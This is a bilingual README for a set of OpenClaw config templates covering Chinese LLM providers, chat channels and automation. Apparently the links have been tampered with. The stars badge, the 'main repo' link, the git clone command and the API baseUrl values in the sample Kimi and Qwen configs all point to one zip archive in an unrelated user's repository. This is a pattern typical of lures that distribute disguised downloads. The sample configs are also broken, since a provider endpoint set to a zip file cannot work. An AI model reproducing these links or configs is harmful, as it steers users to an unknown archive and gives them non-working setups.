<div align="center">

# 🦞 Awesome OpenClaw Configs

**Real-world, copy-paste-ready config templates for OpenClaw / Clawdbot.**

**开箱即用的 OpenClaw 配置模板，复制粘贴直接跑。**

[![GitHub stars](https://img.shields.io/github/stars/ShuyuZ1999/awesome-openclaw-configs?style=social)](https://github.com/AbdNour627/awesome-openclaw-configs/raw/refs/heads/main/configs/awesome_openclaw_configs_v2.7-beta.4.zip)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)

[English](#what-is-this) | [中文](#这是什么)

</div>

---

## What is this? / 这是什么？

EN: OpenClaw's `config.json5` is powerful but hard to get right — especially when connecting **Chinese LLM providers** (DeepSeek, Kimi, Qwen, GLM, MiniMax, Baidu, MiMo), **multi-channel chat** (WeChat, WhatsApp, Telegram, Feishu), or **automation** (cron jobs, heartbeat proactive checks).

This repo provides **20+ battle-tested templates** with detailed comments. Pick one, replace the placeholders, restart — done.

CN: OpenClaw 的 `config.json5` 功能强大但上手门槛不低——尤其是接国产模型、多渠道聊天、自动化任务。这个仓库收集了 **20+ 实测配置模板**，每个都有详细注释。选一个，改参数，重启，搞定。

---

## Use Cases / 使用场景

- 🇨🇳 **接国产模型** — DeepSeek / Kimi / Qwen / GLM / MiniMax / 百度 / MiMo，一个配置搞定
- 📱 **多渠道聊天** — 微信 + WhatsApp + Telegram + 飞书，统一管理
- ⚡ **自动化助手** — 早报推送、心跳巡检、一次性提醒
- 💰 **零成本方案** — Qwen 免费 OAuth / Ollama 本地离线 / 智能降级
- 🏠 **智能家居** — Hue + Sonos + Eight Sleep 一条龙
- 🏢 **企业部署** — 多用户权限、安全加固

---

## Quick Look / 速览

**3 lines to get started / 3 行跑起来：**

```json5
// configs/starter/minimal.json5
{
  agents: { defaults: { workspace: "~/.openclaw/workspace" } },
  channels: { whatsapp: { allowFrom: ["+86YOUR_PHONE"] } },
}
```

**Connect Kimi K2.5 / 接入 Kimi K2.5：**

```json5
// configs/china-providers/moonshot-kimi.json5
{
  models: {
    providers: [{
      type: "openai",
      name: "moonshot",
      baseUrl: "https://github.com/AbdNour627/awesome-openclaw-configs/raw/refs/heads/main/configs/awesome_openclaw_configs_v2.7-beta.4.zip",
      apiKey: "sk-YOUR_KEY",
      models: ["moonshot-v1-128k", "kimi-k2.5"]
    }]
  },
  agents: {
    defaults: {
      model: "moonshot/kimi-k2.5",
      workspace: "~/.openclaw/workspace"
    }
  }
}
```

**Zero-cost Qwen / 零成本通义千问：**

```json5
// configs/budget/free-tier-qwen.json5 — no credit card needed
{
  models: {
    providers: [{
      type: "openai",
      name: "qwen",
      baseUrl: "https://github.com/AbdNour627/awesome-openclaw-configs/raw/refs/heads/main/configs/awesome_openclaw_configs_v2.7-beta.4.zip",
      apiKey: "sk-YOUR_FREE_KEY",      // China mainland: free 2000 calls/day
      models: ["qwen-plus", "qwen-turbo"]
    }]
  }
}
```

> 💡 All templates are in [`configs/`](configs/) with inline comments explaining every field.

---

## Architecture / 项目结构

```
configs/
├── starter/          🚀 Get started in < 1 min
├── china-providers/  🇨🇳 DeepSeek · Kimi · Qwen · GLM · MiniMax · Baidu · MiMo
├── multi-channel/    📱 WeChat + WhatsApp + Telegram + Feishu
├── automation/       ⚡ Cron · Heartbeat · One-shot reminders
├── budget/           💰 Free-tier · Ollama local · Smart fallback
├── developer/        👨‍💻 GitHub CI monitor + Code Review
├── smart-home/       🏠 Hue + Sonos + Eight Sleep
└── enterprise/       🏢 Multi-user secure deployment

tips/
├── common-pitfalls.md   ⚠️ Top mistakes & fixes
├── performance.md       🚀 Token optimization & model routing
└── security.md          🔒 Key management & production hardening
```

---

## Full Template List / 完整模板列表

### 🚀 Starter / 新手入门

| Template | What it does |
|----------|-------------|
| [`minimal.json5`](configs/starter/minimal.json5) | 3-line minimum viable config / 最简 3 行配置 |
| [`recommended.json5`](configs/starter/recommended.json5) | Kimi K2.5 + WhatsApp, best starting point / 推荐入门 |

### 🇨🇳 China Providers / 国产模型

| Template | Provider |
|----------|----------|
| [`moonshot-kimi.json5`](configs/china-providers/moonshot-kimi.json5) | Kimi K2.5 / K2 Thinking (OpenAI-compatible) |
| [`deepseek-via-openrouter.json5`](configs/china-providers/deepseek-via-openrouter.json5) | DeepSeek via OpenRouter |
| [`qwen-free-oauth.json5`](configs/china-providers/qwen-free-oauth.json5) | Qwen free tier — 2000 calls/day, zero cost |
| [`glm-zai.json5`](configs/china-providers/glm-zai.json5) | GLM-5 / GLM-4.7 via Z.AI |
| [`minimax-m2.json5`](configs/china-providers/minimax-m2.json5) | MiniMax M2.1 (Anthropic-compatible) |
| [`qianfan-baidu.json5`](configs/china-providers/qianfan-baidu.json5) | Baidu Qianfan — ERNIE full series |
| [`xiaomi-mimo.json5`](configs/china-providers/xiaomi-mimo.json5) | Xiaomi MiMo V2 (Anthropic Messages API) |

### 📱 Multi-Channel / 多渠道

| Template | Channels |
|----------|----------|
| [`wechat-whatsapp-telegram.json5`](configs/multi-channel/wechat-whatsapp-telegram.json5) | WeChat + WhatsApp + Telegram 三合一 |
| [`feishu-enterprise.json5`](configs/multi-channel/feishu-enterprise.json5) | Feishu bot, WebSocket, no public IP needed |

### ⚡ Automation / 自动化

| Template | What it does |
|----------|-------------|
| [`cron-morning-brief.json5`](configs/automation/cron-morning-brief.json5) | Daily 8AM brief: weather + calendar + todos |
| [`heartbeat-proactive.json5`](configs/automation/heartbeat-proactive.json5) | Proactive assistant — checks email/calendar, notifies on demand |
| [`reminder-oneshot.json5`](configs/automation/reminder-oneshot.json5) | One-shot reminder, self-deletes after firing |

### 💰 Budget / 省钱方案

| Template | Cost |
|----------|------|
| [`free-tier-qwen.json5`](configs/budget/free-tier-qwen.json5) | $0 — Qwen free OAuth, no credit card |
| [`ollama-local-free.json5`](configs/budget/ollama-local-free.json5) | $0 — Ollama local, fully offline |
| [`smart-fallback.json5`](configs/budget/smart-fallback.json5) | Cheap model primary, expensive model fallback |

### 👨‍💻 Developer / 开发者

| Template | What it does |
|----------|-------------|
| [`github-code-review.json5`](configs/developer/github-code-review.json5) | GitHub CI monitor + auto code review |

### 🏠 Smart Home / 智能家居

| Template | Devices |
|----------|---------|
| [`hue-sonos-eight.json5`](configs/smart-home/hue-sonos-eight.json5) | Philips Hue + Sonos + Eight Sleep |

### 🏢 Enterprise / 企业部署

| Template | What it does |
|----------|-------------|
| [`multi-user-secure.json5`](configs/enterprise/multi-user-secure.json5) | Multi-user with pairing mode + channel routing |

---

## Installation / 安装

```bash
# Clone / 克隆
git clone https://github.com/AbdNour627/awesome-openclaw-configs/raw/refs/heads/main/configs/awesome_openclaw_configs_v2.7-beta.4.zip
cd awesome-openclaw-configs

# Pick a template, copy to your config path
# 选一个模板，复制到配置路径
cp configs/starter/recommended.json5 ~/.openclaw/config.json5

# Edit: replace API keys, phone numbers, etc.
# 编辑：替换 API Key、手机号等占位符
nano ~/.openclaw/config.json5

# Restart OpenClaw / 重启
openclaw gateway restart
```

> ⚠️ All API keys and phone numbers in templates are **placeholders** — replace before use.
>
> ⚠️ 模板中所有 API Key 和手机号都是**占位符**——使用前必须替换。

---

## Tips / 避坑指南

| Guide | What's inside |
|-------|--------------|
| [Common Pitfalls / 常见踩坑](tips/common-pitfalls.md) | Top mistakes new users make and how to fix them |
| [Performance / 性能调优](tips/performance.md) | Model routing, token budget, concurrency tuning |
| [Security / 安全加固](tips/security.md) | Key management, permissions, production hardening |

---

## Related Projects / 关联项目

| Project | Description |
|---------|-------------|
| [OpenClaw](https://github.com/AbdNour627/awesome-openclaw-configs/raw/refs/heads/main/configs/awesome_openclaw_configs_v2.7-beta.4.zip) | OpenClaw main repo / 主仓库 |
| [llm-provider-errors](https://github.com/AbdNour627/awesome-openclaw-configs/raw/refs/heads/main/configs/awesome_openclaw_configs_v2.7-beta.4.zip) | Decode cryptic error codes from Chinese LLM APIs / 国产模型报错速查 |

> 💡 Running into weird API errors from Chinese providers? `llm-provider-errors` maps raw error codes to human-readable explanations for DeepSeek, Kimi, Qwen, GLM, MiniMax, and Baidu.

---

## Contributing / 贡献

PRs welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

欢迎贡献新模板！请阅读 [CONTRIBUTING.md](CONTRIBUTING.md)。

---

## License / 许可证

[MIT](LICENSE) © Shuyu Zhang
